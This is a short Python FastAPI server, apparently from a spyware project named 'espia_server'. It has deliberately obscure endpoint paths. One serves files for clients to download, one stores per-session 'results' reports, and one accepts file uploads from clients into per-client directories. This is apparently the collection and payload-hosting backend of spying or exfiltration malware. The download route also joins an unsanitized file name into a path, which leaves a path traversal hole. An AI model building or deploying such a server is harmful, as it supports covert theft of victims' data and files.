import os
import pathlib
from fastapi import FastAPI, File, UploadFile, Request
from starlette.responses import FileResponse

from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block

# In production we don't want any docs served
if os.getenv("ESPIA_ENV") == 'prod':
    print(block + "[+] Running in production env")
    app = FastAPI(docs_url=None, redoc_url=None)
else:
    app = FastAPI()


@app.get("/")
def root_path() -> dict:
    return {}


@app.get("/bahaha/{file}")
def download_file(file: str):
    static_files_path = f'{pathlib.Path(__file__).parent}/static_files'
    return FileResponse(path=f'{static_files_path}/{file}', media_type='application/octet-stream', filename=file)


@app.post("/zn1123n/asnndj")
def upload_results(results: dict) -> dict:
    session_id = results.get('Session-ID')
    create_new_client_dir(session_id)
    handle_products_results(session_id, results)
    return {}


@app.post("/zn1123n/asnndj/bbcsgq")
async def create_upload_file(request: Request, fileUpload: UploadFile = File(...)) -> dict:
    file_path = handle_new_uploaded_file(request.headers.get('Session'), fileUpload.filename)
    with open(file_path, 'wb') as f:
        content = await fileUpload.read()
        f.write(content)
    return {}
